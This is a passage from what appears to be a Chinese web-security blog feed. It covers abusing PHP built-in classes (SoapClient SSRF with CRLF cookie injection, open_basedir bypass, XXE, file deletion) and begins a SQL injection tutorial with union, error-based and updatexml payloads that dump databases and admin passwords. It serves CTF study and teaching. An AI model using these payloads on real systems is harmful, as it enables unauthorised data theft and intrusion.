class="hljs-variable">$str</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$str</span>,<span class="hljs-number">2</span>);<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> SYCLOVER();<br><span class="hljs-variable">$c</span>-&gt;syc = <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$c</span>-&gt;lover = <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span>(urlencode(serialize(<span class="hljs-variable">$c</span>)));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里 <code>$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;</code> 中为什么要在前面加上一个 <code>?&gt;</code> 呢？因为 <code>Exception</code> 类与 <code>Error</code> 的 <code>__toString</code> 方法在eval()函数中输出的结果是不可能控的，即输出的报错信息中，payload前面还有一段杂乱信息“Error: ”：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">Error: </span>payload in D:\phpstudy_pro\WWW\index.php:2 <br>Stack trace:<br>#0 &#123;main&#125;<br></code></pre></td></tr></table></figure><p>进入eval()函数会类似于：<code>eval(&quot;...Error: &lt;?php payload ?&gt;&quot;)</code>。所以我们要用 <code>?&gt;</code> 来闭合一下，即 <code>eval(&quot;...Error: ?&gt;&lt;?php payload ?&gt;&quot;)</code>，这样我们的payload便能顺利执行了。</p><h4 id="使用-SoapClient-类进行-SSRF"><a href="#使用-SoapClient-类进行-SSRF" class="headerlink" title="使用 SoapClient 类进行 SSRF"></a>使用 SoapClient 类进行 SSRF</h4><p>PHP 的内置类<code>SoapClient</code>是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的PHP客户端。</p><p>该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送<code>HTTP</code>和<code>HTTPS</code>请求。正是这个<code>__call</code>方法，使得<code>SoapClient</code>类可以被我们运用在<code>SSRF</code>中。</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">public</span> SoapClient <span class="hljs-type">:: SoapClient</span>(mixed $wsdl <span class="hljs-meta">[</span>，<span class="hljs-built_in">array</span> $options <span class="hljs-meta">]</span>)<br></code></pre></td></tr></table></figure><ul><li>第一个参数是用来指明是否是<code>wsdl</code>模式，将该值设为<code>null</code>则表示非<code>wsdl</code>模式。</li><li>第二个参数为一个数组，如果在<code>wsdl</code>模式下，此参数可选；如果在非<code>wsdl</code>模式下，则必须设置<code>location</code>和<code>uri</code>选项，其中<code>location</code>是要将请求发送到的SOAP服务器的URL，而<code>uri</code>是SOAP服务的目标命名空间。</li></ul><p>我们可以设置第一个参数为null，然后第二个参数的<code>location</code>选项设置为<code>target_url。</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://192.168.133.128:2333/aaa&#x27;</span>, <span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://192.168.133.128:2333&#x27;</span>));<br><span class="hljs-variable">$b</span> = serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span> = unserialize(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;a();    <span class="hljs-comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>首先在<code>47.xxx.xxx.72</code>上面起个监听：</p><p>然后执行上述代码，如下图所示成功触发SSRF，<code>47.xxx.xxx.72</code>上面收到了请求信息：</p><p><img src="https://woshilnp.github.io/wzimg/425.png" alt="a"></p><p>但是，由于它仅限于<code>HTTP/HTTPS</code>协议，所以用处不是很大。而如果这里HTTP头部还存在CRLF漏洞的话，但我们则可以通过SSRF+CRLF，插入任意的HTTP头。</p><p>如下测试代码，我们在HTTP头中插入一个cookie：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&#x27;http://192.168.133.128:2333/&#x27;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>, <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;WHOAMI\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4&quot;</span>, <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&#x27;test&#x27;</span>));<br><span class="hljs-variable">$b</span> = serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span> = unserialize(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;a();    <span class="hljs-comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>例题可参考：<a href="'https://www.cnblogs.com/w0s1np/p/14559483.html'">[MRCTF2020]Ezpop_Revenge</a></p><h4 id="使用-DirectoryIterator-类绕过-open-basedir"><a href="#使用-DirectoryIterator-类绕过-open-basedir" class="headerlink" title="使用 DirectoryIterator 类绕过 open_basedir"></a>使用 DirectoryIterator 类绕过 open_basedir</h4><p><code>DirectoryIterator</code>类提供了一个用于查看文件系统目录内容的简单接口，该类是在 PHP 5 中增加的一个类</p><p><code>DirectoryIterator</code>与<code>glob://</code>协议结合将无视<code>open_basedir</code>对目录的限制，可以用来列举出指定目录下的文件。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;w0s1np&#x27;</span>];<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$dir</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;__toString().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment"># payload一句话的形式:</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;__toString().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);&#125;<br></code></pre></td></tr></table></figure><p>我们输入 <code>/?w0s1np=glob:///*</code> 即可列出根目录下的文件：</p><p>但是会发现只能列根目录和<code>open_basedir</code>指定的目录的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容。</p><p><img src="/wzimg/7.png" alt="a"></p><h4 id="使用-SimpleXMLElement-类进行-XXE"><a href="#使用-SimpleXMLElement-类进行-XXE" class="headerlink" title="使用 SimpleXMLElement 类进行 XXE"></a>使用 SimpleXMLElement 类进行 XXE</h4><p><img src="/wzimg/8.png" alt="b"></p><p><img src="/wzimg/9.png" alt="c"></p><p>可以看到通过设置第三个参数<code>data_is_url</code>为 <code>true</code>，我们可以实现远程<code>xml</code>文件的载入。第二个参数的常量值我们设置为<code>2</code>即可。第一个参数<code>data</code>就是我们自己设置的<code>payload</code>的<code>url</code>地址，即用于引入的外部实体的<code>url</code>。</p><p>这样的话，当我们可以控制目标调用的类的时候，便可以通过<code>SimpleXMLElement</code>这个内置类来构造 XXE。</p><h4 id="ZipArchive-open-删除文件"><a href="#ZipArchive-open-删除文件" class="headerlink" title="ZipArchive::open 删除文件"></a>ZipArchive::open 删除文件</h4><p>使用条件：</p><ul><li>要调用对象的open函数，且open函数中的参数可控</li><li>第二个参数设置为<code>ZipArchive::OVERWRITE</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> ZipArchive();<br><span class="hljs-variable">$a</span>-&gt;open(<span class="hljs-string">&#x27;1.txt&#x27;</span>,ZipArchive::OVERWRITE);<br><span class="hljs-comment">// ZipArchive::OVERWRITE:  总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖</span><br><span class="hljs-comment">// 因为没有保存，所以效果就是删除了1.txt</span><br></code></pre></td></tr></table></figure><p>运行之后就删除了<code>1.txt</code></p><p>例题参考：[NepCTF2021 梦里花开牡丹亭]</p><p><code>https://www.cnblogs.com/w0s1np/p/14641597.html</code></p><h4 id="GlobIterator-遍历目录"><a href="#GlobIterator-遍历目录" class="headerlink" title="GlobIterator 遍历目录"></a>GlobIterator 遍历目录</h4><p>使用条件：</p><ul><li>遍历对象</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">GlobIterator</span>::__construct(<span class="hljs-keyword">string</span> <span class="hljs-variable">$pattern</span>, [<span class="hljs-keyword">int</span> <span class="hljs-variable">$flag</span>])<br>从使用<span class="hljs-variable">$pattern</span>构造一个新的目录迭代<br></code></pre></td></tr></table></figure><p>使用例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$newclass</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-string">&quot;./*.php&quot;</span>,<span class="hljs-number">0</span>);<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$newclass</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27;=&gt;&#x27;</span>.<span class="hljs-variable">$value</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>例题参考：<a href="'https://www.cnblogs.com/w0s1np/p/14659346.html'">[红日Day3-CTF]实例化任意对象漏洞</a></p><h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p><a href="https://xz.aliyun.com/t/9293">https://xz.aliyun.com/t/9293</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入攻击</title>
    <link href="/2021/04/08/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/"/>
    <url>/2021/04/08/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h1><h3 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h3><p>SQL其实是一门对数据库操作语言，但是在一些<code>web</code>应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操纵；这就是我们常说的SQL注入</p><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><ul><li>参数用户可控：前端传入后端的内容是用户可以控制的；</li><li>参数带入数据库查询：传入的参数拼接到SQL语句，并且带入数据库查询。</li></ul><h3 id="与MySQL相关知识点："><a href="#与MySQL相关知识点：" class="headerlink" title="与MySQL相关知识点："></a>与MySQL相关知识点：</h3><p>MySQL其实就是一个数据库，再里面储存了很多的数据，在MySQL5.0版本以后，MySQL默认在数据库中存放了一个<code>information_schema</code>数据库，在该库里面，有三个表名值得我们注意：<code>SCHEMATA</code> <code>TABLES</code> <code>COLUMNS</code></p><p><code>SCHEMATA</code>表存放在用户储存的所有数据库名，其中字段名为：<code>SCHEMA_NAME</code></p><p><code>TABLES</code>表存放在用户储存的所有数据库名和表名，其中字段名分别为：<code>TABLE_SCHEMA</code> <code>TABLE_NAME</code></p><p><code>COLUMNS</code>表存放在用户储存的所有数据库名和表名和字段名，其中字段名分别为：<code>TABLE_SCHEMA</code> <code>TABLE_NAME</code> <code>COLUMN_NAME</code></p><p><code>CONCAT()</code>：用于将多个字符串连接成一个字符串</p><p><code>group_concat()</code>：连接一个组的所有字符串，并以逗号分隔每一条数据。通俗的讲，就是将你查询的结果全部整合一起排出来</p><p><code>rand()</code>：返回0到1之间的随机浮点值.。若已指定一个整数参数 N ，rand(N),则N被用作种子值，用来产生重复序列。</p><p><code>mid()</code>：MID(column_name,start[,length])，例如：<code>mid(database(),1,1)</code>就是说数据库名从第一个字选取一个字</p><p><code>substr()</code>：<code>Substr()</code>和<code>substring()</code>函数实现的功能是一样的，表示被截取的字符串或字符串表达式，参数描述同<code>mid()</code>函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度</p><p><code>left()</code>：得到字符串左部指定个数的字符。例如：Left ( string, n ) <code>string</code>为要截取的字符串，n为长度。</p><p><code>ord()</code>：此函数为返回第一个字符的ASCII码，例如ORD(MID(DATABASE(),1,1))&gt;114 意为检测<code>database()</code>的第一位ASCII码是否大于114，也即是‘r’。</p><p><code>ascii()</code>：将某个字符转换为<code>ascii</code>值；例如：<code>ascii(substr((select database()),1,1))</code>即求得它的<code>ascii</code>码</p><h3 id="有回显的union注入"><a href="#有回显的union注入" class="headerlink" title="有回显的union注入"></a>有回显的union注入</h3><p>如果发现有回显，就可以考虑union注入了，UNION的作用是将两个<code>select</code>查询结果合并，如下图：</p><p><img src="https://z3.ax1x.com/2021/04/08/cYQUj1.png" alt="b"></p><p>在注入之前我们就要找到闭合方式，下面就是常用的闭合吧，闭合之后页面会和每笔和有不一样的变化，所以可以自己分析</p><p>当在传参后面加上单引号，和双引号都报错的话说明是整数型。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-number">1</span><br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=1&#x27;</span>)<br>?id=<span class="hljs-number">1</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">?id=1&quot;</span>)<br></code></pre></td></tr></table></figure><p>找到闭合方式是进行<code>sql</code>的前提，这里需要注意的就是如何根据报错来看闭合：</p><p>例如：</p><p><img src="https://s3.ax1x.com/2020/11/19/DMpiLR.png" alt="sfe"></p><p>这里需要注意的就是看报错的时候，注意去除最左边和最右边的一个单引号。</p><p>找到闭合之后就可以进行<code>union</code>注入了，先查询列数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3#</span><br></code></pre></td></tr></table></figure><p>依次更改数字，当小于等于正确值时，都会正确显示，否则不会显示</p><p>然后根据列数进行注入，代码如下：</p><p>爆库：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,database()#</span><br><span class="hljs-string">?id=1&#x27;</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>爆表：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())#</span><br></code></pre></td></tr></table></figure><p>爆列：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>表名<span class="hljs-string">&#x27;)#</span><br></code></pre></td></tr></table></figure><p>爆数据：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,(select &#x27;</span>列名<span class="hljs-string">&#x27; from &#x27;</span>表名<span class="hljs-string">&#x27;)#</span><br></code></pre></td></tr></table></figure><p>好了，这就是有回显的union注入，但是在做题的时候可没这么简单哦，一般都有过滤，我就遇到过过滤union的，这个时候该怎么办，其实解决方法很简单，换个注入方法或者来个注释绕过，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; /!**union**/ .....</span><br></code></pre></td></tr></table></figure><p>一般的就成功绕过了，再不行也可以尝试下url加密两次，因为浏览器会进行一次解密，但是这个一般我都没用，但也可以尝试下吧，还不行那就换个方法就是了。</p><p>做了一个绕过<code>md5</code>密码的<code>sql</code>注入题我又想起了一些关于<code>union</code>注入的东西：</p><p>我们在查询一些数据库没有的东西，他一样会显示出来，就是说也会进行查询，所以当遇到需要检查我们输入的密码和被查询的密码是否相同的时候我们可以进行查询我们自己的密码，在输入刚才查询的密码，其实这也相当于万能密码之类的。</p><p><img src="https://z3.ax1x.com/2021/04/08/cYQPnP.png" alt="a"></p><p>当没有回显怎么办，先判断是否报错</p><h3 id="有报错的报错注入："><a href="#有报错的报错注入：" class="headerlink" title="有报错的报错注入："></a>有报错的报错注入：</h3><p>如果报错，直接报错注入，常见报错方法：</p><ol><li><p><code>rand()</code>随机数分组报错:即为主键重复</p><p>原理：<code>count()</code>和<code>group by</code>在遇到<code>rand()</code>产生的重复值时报错，其实就是<code>count</code>，<code>rand()</code>，<code>group by</code>三个连用就会造成主键重复报错，与位置无关</p><p>例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;union select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</span><br></code></pre></td></tr></table></figure><p>解释：<code>floor()</code>：向下取整。所以<code>floor(rand(N)*2)</code>只有两个值：0和1。<br><code>group by a</code>：以a进行分组，再计每一组的数。（此时a就代表<code>concat</code>连接而成的字符串），它连接了数据库用户名和随机数（0或1）。<br>只有当种子值为0或-1时，才会报错；所以，为了让它报错而得到我们想要的信息，就要让种子值为0或-1。</p><p>因为<code>floor(rand(0))</code>是稳定序列，再查询虚拟表和写入虚拟表的时候，就会产生主键重复。</p><p>我们可以把<code>payload</code>中的<code>select user()</code>换成其他的查询，爆出我们想要的东西。</p></li><li><p><code>Bigint</code>型数据溢出SQL注入：（适用于MYSQL5.5.5及更高版本）</p><p>~0：对0按位取反，将得到<code>BIGINT</code>无符号数最大值；所以 ~0加上1后会发生溢出。</p><p>当我们执行一条查询时，查询成功会返回0，所以当对查询逻辑取反时，返回值为1。</p><p>以我们可以结合~0和逻辑取反，构造基于报错的payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">!</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x) <span class="hljs-operator">-</span>（ps:这是减号） <span class="hljs-operator">~</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>解释：x就代表<code>select user()</code>的结果.</p></li><li><p><code>Double</code>型数据溢出SQL注入:</p><p>EXP(X)函数：返回e（自然数）的x方。当X传递一个大于709的值时，函数exp()就会引起一个溢出错误，例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()));<br></code></pre></td></tr></table></figure><p>其中<code>~(select user())</code>的值为最大无符号整数，造成<code>exp</code>溢出，顺带会查询出<code>USER()</code>用户名</p></li><li><p> <code>xpath</code>函数报错:</p></li></ol><p>   <code>XPath</code>即为<code>XML</code>路径语言，它是一种用来确定<code>XML</code>文档中某部分位置的语言。</p><p>   <code>extractvalue()</code>函数：对XML文档进行查-询的函数：</p><p>   <code>extractvalue(XML_document,Xpath_string)</code></p><p>   第一个参数：XML文档对象名称；</p><p>   第二个参数：Xpath格式字符串，即文本标记，如 <code>’ /book/author/initial &#39;</code>；</p><p>   返回查询值所包含的字符串，但函数的返回长度有限,为32个字符长度。</p><p>   <code>updatexml()</code>函数：对XML文档进行修改的函数。</p><p>   <code>updatexml(XML_document,Xpath_string,new_value)</code></p><p>   第一个参数：XML文档名；</p><p>   第二个参数：Xpath格式字符串；</p><p>   第三个参数：String格式，用它替换查询到的数据；</p><p>   用指定数据替换查询到的内容，同样查询时返回长度限制32个字符。</p><p>   上面两个函数都必须传入合法的格式<code>“ /xxx/xx/xxx ”</code></p><pre><code> 正常查询语句：</code></pre>   <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;/good/goood&#x27;</span>);<br>````<br><br>查询结果：查询结果为空，但没有语法错误，所以不会报错,所以不会爆出数据。<br>   不合法的查询语句：<br><br>```<span class="hljs-keyword">sql</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-string">&#x27;1&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()));<br></code></pre></td></tr></table></figure><p>   查询结果：发生了报错，Xpath语法错误，执行了第二个参数里的sql语句，把数据库用户名查出来了</p><ol start="5"><li><p>利用列名的重复性报错：</p><p>构造重复的列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> name_const(version(),<span class="hljs-number">1</span>),name_const(version(),<span class="hljs-number">1</span>))a;<br></code></pre></td></tr></table></figure><p>payload如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span><span class="hljs-keyword">sql</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-5</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --+</span><br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://s3.ax1x.com/2020/11/13/D9tysH.png" alt="呜呜呜"></p><p>这方法只能爆个版本，不能爆有用数据，需要和join函数结合起来</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users a <span class="hljs-keyword">join</span> users b)c;<br>ERROR <span class="hljs-number">1060</span> (<span class="hljs-number">42</span>S21): Duplicate <span class="hljs-keyword">column</span> name <span class="hljs-string">&#x27;id&#x27;</span><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users a <span class="hljs-keyword">join</span> users b <span class="hljs-keyword">using</span>(id))c;<br>ERROR <span class="hljs-number">1060</span> (<span class="hljs-number">42</span>S21): Duplicate <span class="hljs-keyword">column</span> name <span class="hljs-string">&#x27;username&#x27;</span><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> a <span class="hljs-keyword">join</span> users b <span class="hljs-keyword">using</span>(id, username))c;<br>ERROR <span class="hljs-number">1060</span> (<span class="hljs-number">42</span>S21): Duplicate <span class="hljs-keyword">column</span> name <span class="hljs-string">&#x27;password&#x27;</span><br></code></pre></td></tr></table></figure></li></ol><p>我就喜欢updatexml,因为好理解，而且非常方便</p><p>爆库：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(&#x27;</span>~<span class="hljs-string">&#x27;,database(),&#x27;</span>~<span class="hljs-string">&#x27;),1)#   //注意~有时候可以换为0x7e</span><br></code></pre></td></tr></table></figure><p>爆表：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(&#x27;</span>~<span class="hljs-string">&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&#x27;</span>~<span class="hljs-string">&#x27;),1) #</span><br></code></pre></td></tr></table></figure><p>爆列</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(&#x27;</span>~<span class="hljs-string">&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>表名<span class="hljs-string">&#x27;),&#x27;</span>~<span class="hljs-string">&#x27;),1) #</span><br></code></pre></td></tr></table></figure><p>爆数据：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(&#x27;</span>~<span class="hljs-string">&#x27;,(select group_concat(admin,&#x27;</span>~<span class="hljs-string">&#x27;,password) from 数据库.表名)),1)#</span><br></code></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp">爆表名<br>?id=<span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">updatexml</span>(<span class="hljs-params"><span class="hljs-number">1</span>,make_set(<span class="hljs-number">3</span>,<span 